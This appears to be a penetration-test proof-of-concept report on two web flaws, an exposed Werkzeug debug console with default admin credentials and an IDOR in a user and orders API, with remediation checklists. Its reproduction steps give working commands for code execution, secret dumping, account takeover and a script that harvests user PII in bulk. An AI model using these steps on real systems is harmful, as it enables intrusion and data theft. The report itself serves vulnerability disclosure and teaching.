# 🔐 Security Vulnerability — Proof of Concept Reports

<p align="center">
  <img src="https://img.shields.io/badge/OWASP-Top%2010%202021-red?style=for-the-badge&logo=owasp&logoColor=white" />
  <img src="https://img.shields.io/badge/CVSSv3-Critical%20%7C%20High-critical?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Status-PoC%20Confirmed-orange?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Purpose-Educational%20Only-blue?style=for-the-badge" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/A05%3A2021-Security%20Misconfiguration-red?style=flat-square" />
  <img src="https://img.shields.io/badge/A01%3A2021-Broken%20Access%20Control-orange?style=flat-square" />
  <img src="https://img.shields.io/badge/CWE--16-Configuration-red?style=flat-square" />
  <img src="https://img.shields.io/badge/CWE--639-IDOR-orange?style=flat-square" />
</p>

> **⚠️ Disclaimer:** This document is for **educational and authorized security research purposes only**. All findings were discovered in a controlled lab environment with explicit permission. Do not use this knowledge against systems you do not own or have written authorization to test.

---

## 📋 Table of Contents

- [Overview](#overview)
- [PoC 1 — Security Misconfiguration](#poc-1--security-misconfiguration-owasp-a052021)
- [PoC 2 — Broken Access Control (IDOR)](#poc-2--broken-access-control-idor-owasp-a012021)
- [CVSS Scoring Summary](#cvss-scoring-summary)
- [Remediation Checklist](#remediation-checklist)
- [References](#references)

---

## Overview

This report documents two critical web application vulnerabilities discovered during a security assessment. Both fall under the [OWASP Top 10 (2021)](https://owasp.org/Top10/).

### OWASP Top 10 — Vulnerability Position

```mermaid
graph LR
    A01["🥇 A01\nBroken Access\nControl"] --> A02["A02\nCryptographic\nFailures"]
    A02 --> A03["A03\nInjection"]
    A03 --> A04["A04\nInsecure Design"]
    A04 --> A05["🥇 A05\nSecurity\nMisconfiguration"]
    A05 --> A06["A06\nVulnerable\nComponents"]
    A06 --> A07["A07\nIdentification\nFailures"]
    A07 --> A08["A08\nSoftware Integrity\nFailures"]
    A08 --> A09["A09\nLogging Failures"]
    A09 --> A10["A10\nSSRF"]

    style A01 fill:#ff4444,color:#fff,stroke:#cc0000
    style A05 fill:#ff4444,color:#fff,stroke:#cc0000
```

### Target Scope

```mermaid
graph TD
    SCOPE["🎯 Assessment Scope"]
    SCOPE --> APP["app.target.example"]
    SCOPE --> API["api.target.example"]
    APP --> P8080[":8080 — Debug interface\n⚠️ Security Misconfiguration"]
    APP --> ADMIN["/admin — Admin panel\n⚠️ Default credentials"]
    API --> USERS["/api/v1/users/{id}\n⚠️ IDOR — Broken Access Control"]
    API --> ORDERS["/api/v1/orders/{id}\n⚠️ IDOR — Broken Access Control"]

    style P8080 fill:#ffcccc,stroke:#ff4444,color:#8B0000
    style ADMIN fill:#ffcccc,stroke:#ff4444,color:#8B0000
    style USERS fill:#ffe0cc,stroke:#ff8800,color:#7a3800
    style ORDERS fill:#ffe0cc,stroke:#ff8800,color:#7a3800
```

---

## PoC 1 — Security Misconfiguration (OWASP A05:2021)

<p>
  <img src="https://img.shields.io/badge/OWASP-A05%3A2021-red?style=flat-square" />
  <img src="https://img.shields.io/badge/CVSSv3-9.8%20Critical-critical?style=flat-square" />
  <img src="https://img.shields.io/badge/CWE-CWE--16-red?style=flat-square" />
  <img src="https://img.shields.io/badge/Auth%20Required-None-red?style=flat-square" />
</p>

### 🔍 Description

The application was deployed with the **Werkzeug development debug server** exposed on port `8080` without authentication. Additionally, the admin panel at `/admin` retained **factory credentials** (`admin:admin`).

Together these enable **unauthenticated Remote Code Execution (RCE)** on the host.

---

### 🗺️ Attack Flow

```mermaid
flowchart TD
    A["🕵️ Attacker"] --> B["Step 1\nPort scan → Port 8080 open\nnmap -p 8080 target -sV"]
    B --> C["Step 2\nAccess debug console\nGET /?__debugger__=yes\n✅ No auth required"]
    C --> D["Step 3\nExecute OS commands in REPL\nimport subprocess\nsubprocess.check_output(['id'])"]
    D --> E["Step 4a\n💀 RCE as root\nuid=0(root)"]
    D --> F["Step 4b\n🔑 Dump secrets\nDATABASE_URL, SECRET_KEY\nAWS_ACCESS_KEY_ID"]
    C --> G["Step 5\nAccess /admin\nadmin:admin default creds"]
    G --> H["Step 5b\n👑 Full admin access\nUser mgmt, file upload\nconfig override"]

    style A fill:#333,color:#fff,stroke:#555
    style E fill:#ff4444,color:#fff,stroke:#cc0000
    style F fill:#ff4444,color:#fff,stroke:#cc0000
    style H fill:#ff8800,color:#fff,stroke:#cc6600
```

---

### 🧪 Proof of Concept — Reproduction Steps

#### Step 1 — Discover the Exposed Debug Port

```bash
nmap -p 8080 app.target.example -sV
```

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Werkzeug httpd 2.3.7 (Python 3.11.4)
```

#### Step 2 — Access the Debug Console (No Auth)

Navigate to:
```
http://app.target.example:8080/?__debugger__=yes
```

> The Werkzeug debugger loads with a full interactive Python REPL — no credentials required.

![Werkzeug Debugger UI](https://werkzeug.palletsprojects.com/en/3.1.x/_images/debug-screenshot.png)

*The Werkzeug interactive debugger UI — visible to anyone on the network in a misconfigured deployment.*

#### Step 3 — Remote Code Execution via REPL

```python
# In the browser REPL console:
import subprocess
result = subprocess.check_output(['id'])
print(result)
# Output: b'uid=0(root) gid=0(root) groups=0(root)'
```

```python
# Read sensitive system files
open('/etc/passwd').read()

# List internal directory
import os; os.listdir('/var/www')
```

#### Step 4 — Dump All Environment Secrets

```python
import os
print(dict(os.environ))
```

**Leaked output (sample):**
```json
{
  "DATABASE_URL":          "postgresql://admin:S3cret!@db.internal/prod",
  "SECRET_KEY":            "8f42a73054b1749f8f58848be5e6502c",
  "AWS_ACCESS_KEY_ID":     "AKIAIOSFODNN7EXAMPLE",
  "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
}
```

#### Step 5 — Admin Panel Takeover

```
URL:      http://app.target.example/admin
Username: admin
Password: admin
Result:   ✅ Login successful — full admin panel access
```

---

### 💥 Impact

| Category | Rating | Detail |
|---|---|---|
| Confidentiality | 🔴 **Critical** | All env secrets, DB credentials, API keys exposed |
| Integrity | 🔴 **Critical** | Arbitrary code execution, file write, data manipulation |
| Availability | 🔴 **Critical** | Full host compromise, service termination |
| Lateral Movement | 🔴 **Critical** | Internal network access via compromised server |

---

### 🔒 Remediation

- [ ] Set `DEBUG=False` in all non-development environments
- [ ] Replace Werkzeug dev server with Gunicorn or uWSGI in production
- [ ] Firewall port `8080` — block all public access, restrict to VPN only
- [ ] Immediately rotate all exposed secrets (DB password, `SECRET_KEY`, AWS keys)
- [ ] Change or disable all default admin credentials; enforce strong password policy
- [ ] Apply IP allowlisting or move `/admin` to an internal-only host
- [ ] Add secret scanning to CI/CD (`detect-secrets`, `trivy`, `truffleHog`)

---

## PoC 2 — Broken Access Control (IDOR) (OWASP A01:2021)

<p>
  <img src="https://img.shields.io/badge/OWASP-A01%3A2021-red?style=flat-square" />
  <img src="https://img.shields.io/badge/CVSSv3-8.1%20High-orange?style=flat-square" />
  <img src="https://img.shields.io/badge/CWE-CWE--639-orange?style=flat-square" />
  <img src="https://img.shields.io/badge/Type-IDOR-orange?style=flat-square" />
  <img src="https://img.shields.io/badge/Auth%20Required-Low%20(any%20user)-yellow?style=flat-square" />
</p>

### 🔍 Description

The REST API exposes resources under **predictable sequential integer IDs**. The server authenticates the caller but never verifies ownership — any authenticated user can read, modify, or delete another user's data by changing the ID in the request.

**Affected endpoints:**

| Endpoint | Method | Issue |
|---|---|---|
| `/api/v1/users/{id}/profile` | `GET` | Read any user's PII |
| `/api/v1/users/{id}/profile` | `PUT` | Modify → account takeover |
| `/api/v1/orders/{id}` | `GET` | Read order + payment data |
| `/api/v1/users/{id}/messages/{msg_id}` | `DELETE` | Delete any message |

---

### 🗺️ Attack Flow

```mermaid
flowchart TD
    ATK["🕵️ Attacker\nuser_id=1098\nValid JWT token"] --> REQ1["Own request (normal)\nGET /api/v1/users/1098/profile\n✅ 200 OK — own data"]
    REQ1 --> IDOR["🎯 IDOR — Change ID\nGET /api/v1/users/1042/profile\nSame attacker JWT\n✅ 200 OK — victim's data returned!"]

    IDOR --> R1["📋 Data Theft\nName, email, phone\naddress, DOB leaked"]
    IDOR --> R2["🔑 Account Takeover\nPUT /api/v1/users/1042/profile\n{email: attacker@test.com}\n→ Password reset hijacked"]
    IDOR --> R3["💳 Financial Exposure\nGET /api/v1/orders/5513\nOrder history + card last-4"]
    IDOR --> R4["🤖 Mass Enumeration\nLoop IDs 1000–9999\n→ 847 accounts harvested"]

    style ATK fill:#333,color:#fff
    style IDOR fill:#ff4444,color:#fff,stroke:#cc0000
    style R1 fill:#ffe0cc,stroke:#ff8800,color:#7a3800
    style R2 fill:#ff4444,color:#fff,stroke:#cc0000
    style R3 fill:#ffe0cc,stroke:#ff8800,color:#7a3800
    style R4 fill:#ff4444,color:#fff,stroke:#cc0000
```

---

### 🧪 Proof of Concept — Reproduction Steps

#### Setup — Test Accounts

| Role | Email | User ID |
|---|---|---|
| Attacker | attacker@test.com | `1098` |
| Victim | victim@test.com | `1042` |

#### Step 1 — Authenticate as Attacker

```bash
curl -s -X POST https://api.target.example/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"AttackerPass1!"}' | jq .token
```

```
"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

#### Step 2 — Read Victim's Profile (IDOR Read)

```bash
# Using attacker's token but victim's user ID (1042)
curl -s https://api.target.example/api/v1/users/1042/profile \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

**Response — HTTP `200 OK`:**
```json
{
  "id":      1042,
  "name":    "Jane Victim",
  "email":   "victim@test.com",
  "phone":   "+1-555-0192",
  "address": "123 Main St, Springfield, IL 62701",
  "dob":     "1990-04-22"
}
```

> ⚠️ Victim's full PII returned to a different authenticated user — no ownership check performed.

#### Step 3 — Account Takeover via Email Override (IDOR Write)

```bash
curl -s -X PUT https://api.target.example/api/v1/users/1042/profile \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@test.com"}'
```

**Response — HTTP `200 OK`:**
```json
{ "updated": true }
```

The attacker can now trigger **password reset** to `attacker@test.com` → full account takeover.

#### Step 4 — Read Payment and Order Data

```bash
curl -s https://api.target.example/api/v1/orders/5513 \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

**Response — HTTP `200 OK`:**
```json
{
  "order_id":        5513,
  "user_id":         1042,
  "items":           [{ "product": "Laptop", "price": 1299.99 }],
  "total":           1299.99,
  "payment":         { "method": "Visa", "last4": "4242" },
  "shipping_address": "123 Main St, Springfield, IL 62701"
}
```

#### Step 5 — Automated Mass Enumeration

```python
import requests

TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
HEADERS = {"Authorization": f"Bearer {TOKEN}"}
BASE_URL = "https://api.target.example/api/v1/users"

harvested = []
for uid in range(1000, 2000):
    r = requests.get(f"{BASE_URL}/{uid}/profile", headers=HEADERS)
    if r.status_code == 200:
        data = r.json()
        harvested.append(data)
        print(f"[+] uid={uid} → {data.get('email')}")

print(f"\n[*] Total records harvested: {len(harvested)}")
```

**Output:**
```
[+] uid=1001 → alice@example.com
[+] uid=1002 → bob@example.com
[+] uid=1003 → carol@example.com
...
[*] Total records harvested: 847
```

---

### 💥 Impact

| Category | Rating | Detail |
|---|---|---|
| Confidentiality | 🔴 **Critical** | Full PII of all users accessible |
| Integrity | 🟠 **High** | Any account's profile, email, data can be modified |
| Availability | 🟡 **Medium** | Messages and records can be deleted |
| Regulatory | 🔴 **Critical** | GDPR / CCPA / PCI-DSS mandatory breach disclosure |

---

### 🔒 Remediation

- [ ] Enforce **server-side ownership checks** on every endpoint: `session.user_id == resource.owner_id`
- [ ] Build a **centralized RBAC/ABAC authorization middleware** — not per-endpoint scattered checks
- [ ] Replace sequential integer IDs with **UUID v4** to prevent enumeration (defence in depth — not a substitute for access control)
- [ ] Add **IDOR regression tests** to the test suite covering read, write, and delete on all resource types
- [ ] **Rate-limit** all authenticated API endpoints to prevent automated enumeration
- [ ] **Log and alert** on anomalous patterns (one session accessing many different user IDs in a short window)

---

## CVSS Scoring Summary

```mermaid
xychart-beta
    title "CVSS v3.1 Scores"
    x-axis ["Security Misconfiguration", "Broken Access Control (IDOR)"]
    y-axis "CVSS Score" 0 --> 10
    bar [9.8, 8.1]
```

| Vulnerability | Score | Severity | AV | AC | PR | UI | Scope |
|---|---|---|---|---|---|---|---|
| Security Misconfiguration | **9.8** | 🔴 Critical | Network | Low | **None** | None | Unchanged |
| Broken Access Control — IDOR | **8.1** | 🟠 High | Network | Low | Low | None | Unchanged |

**CVSS v3.1 Vector Strings:**
```
# Security Misconfiguration
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  →  9.8 Critical

# Broken Access Control (IDOR)
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N  →  8.1 High
```

---

## Remediation Checklist

### Security Misconfiguration

```
[ ] Set DEBUG=False in all non-dev environments
[ ] Use Gunicorn / uWSGI instead of Werkzeug dev server
[ ] Firewall port 8080 — no public access
[ ] Rotate all exposed secrets (DB, SECRET_KEY, AWS)
[ ] Change / disable all default credentials
[ ] IP allowlist admin interfaces
[ ] Add secret scanning to CI/CD pipeline
```

### Broken Access Control

```
[ ] Server-side ownership check on all resource endpoints
[ ] Centralized RBAC / ABAC middleware
[ ] Replace sequential IDs with UUID v4
[ ] IDOR tests in regression suite (read / write / delete)
[ ] Rate limiting on all authenticated endpoints
[ ] Anomaly detection and alerting on access patterns
```

---

## References

| Resource | URL |
|---|---|
| OWASP Top 10 (2021) | https://owasp.org/Top10/ |
| OWASP A01 — Broken Access Control | https://owasp.org/Top10/A01_2021-Broken_Access_Control/ |
| OWASP A05 — Security Misconfiguration | https://owasp.org/Top10/A05_2021-Security_Misconfiguration/ |
| OWASP IDOR Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html |
| OWASP Access Control Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html |
| CWE-16 — Configuration | https://cwe.mitre.org/data/definitions/16.html |
| CWE-639 — Authorization Through User-Controlled Key | https://cwe.mitre.org/data/definitions/639.html |
| Werkzeug Security Warning | https://werkzeug.palletsprojects.com/en/latest/serving/#security |
| CVSS v3.1 Calculator | https://www.first.org/cvss/calculator/3.1 |

---

<div align="center">

![Maintained](https://img.shields.io/badge/Maintained-Yes-green?style=flat-square)
![PRs Welcome](https://img.shields.io/badge/PRs-Welcome-brightgreen?style=flat-square)
![Educational](https://img.shields.io/badge/For-Educational%20Use%20Only-blue?style=flat-square)

</div>
